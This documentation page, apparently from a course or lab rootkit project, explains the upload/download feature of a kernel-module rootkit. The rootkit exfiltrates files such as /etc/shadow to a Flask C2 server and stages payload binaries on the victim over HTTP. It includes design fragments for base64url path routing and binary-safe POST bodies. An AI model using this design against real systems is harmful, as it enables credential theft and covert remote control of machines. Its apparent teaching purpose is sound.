---
title: Upload / Download
description: Bidirectional file transfer between the attacker and the victim, implemented entirely from kernel space over HTTP.
---

**Optional · 3 pts**

Bidirectional file transfer between the attacker and the victim, implemented entirely from kernel space over HTTP.

## Context

The upload/download feature allows the attacker to retrieve any file from the victim (e.g. `/etc/shadow`) and push arbitrary files to it (e.g. a payload binary). Everything goes through the existing HTTP channel, with no additional port or protocol.

Implementing this from a kernel module raised two hard problems that did not exist for simple command execution: how to send **binary file content** through an HTTP layer built on C strings, and how to include an **arbitrary file path** in a URL without breaking routing.

## The initial approach and its problems

The first implementation used a single route `/api/<uuid>/file` for all file transfers. The target path was passed as a custom HTTP header `X-Filename: /etc/shadow` in the request. Two new HTTP helper functions were written from scratch in the kernel module — one for upload, one for download — duplicating code that already existed.

**Problem 1 — code duplication:**

```c
// Two new functions, essentially reimplementing http_get() and http_post()
// just to add one extra header — all the socket/connect/send logic duplicated
static int http_get_file(const char *host, const char *uuid, char *out, size_t *out_len);
static int http_post_file(const char *host, const char *uuid,
                          const char *filename, const char *buf, size_t len);
```

**Problem 2 — race condition:**

```c
// If two files are staged quickly, the rootkit always hits /api/<uuid>/file
// and picks up "the next file" — whichever the server decides to return.
// If a second upload is queued before the first is consumed, the rootkit
// may fetch them in the wrong order, or skip one entirely.
GET /api/<uuid>/file   ← which file? depends on server-side queue state
```

## The fix: path in the URL with URL-safe base64

The endpoint was redesigned to embed the file path directly in the URL as `/api/<uuid>/file/<path>`. This way:

- The existing `http_get()` and `http_post()` functions can be reused as-is — no duplication
- Each file gets its own unique URL, so the rootkit fetches exactly the right file with no ambiguity
- Race conditions disappear: two concurrent uploads have two distinct URLs

File paths contain `/` characters which would break URL routing. Percent-encoding (`%2F` for `/`) does not work: Flask automatically decodes `%2F` back to `/` before route matching. Standard base64 also fails since it uses `+` (space in URLs) and `/` (path separator). **URL-safe base64** replaces both with `-` and `_`, producing a string that Flask routes as a single opaque segment.

```
/etc/shadow  →  base64url  →  L2V0Yy9zaGFkb3c
/tmp/payload →  base64url  →  L3RtcC9wYXlsb2Fk

// Download: rootkit POSTs the file content to its unique URL
POST /api/<uuid>/file/L2V0Yy9zaGFkb3c

// Upload: rootkit GETs the staged file from its unique URL
GET  /api/<uuid>/file/L3RtcC9wYXlsb2Fk
```

:::note[Decoding on the C2 side]
Flask decodes with `base64.urlsafe_b64decode(path_b64 + '==')`. The `==` padding is re-added before decoding since standard Python base64 requires it, even though we strip it on the kernel side to keep URLs clean.
:::

## Problem 3: binary content and NUL bytes

A separate issue arose when testing with binary files. The HTTP POST helper originally used `strlen()` to compute the body length. This works for text payloads (stdout, stderr) but silently truncates binary files at the first NUL byte (`0x00`). An ELF binary starts with `7f 45 4c 46 00 02…` — it would be sent as a 4-byte payload.

**Fix:** pass the actual byte length as a separate parameter alongside the buffer, and use `Content-Length: <n>` with the real size instead of relying on `strlen()`.

```c
// Before (broken for binary):
http_post(sock, path, buf, strlen(buf));

// After (correct):
http_post(sock, path, buf, actual_len);   // actual_len from file stat
```

## Usage

**Download (victim → C2):**  
In the C2 dashboard, use the Action modal → "Download File", enter the remote path (e.g. `/etc/shadow`). The rootkit reads the file and POSTs it to the C2. The file appears in the transfers panel with a save link.

**Upload (C2 → victim):**  
In the C2 dashboard, use the Action modal → "Upload File", select a local file and specify the destination path on the victim. The C2 stages the file; the rootkit fetches it and writes it to the victim's filesystem.
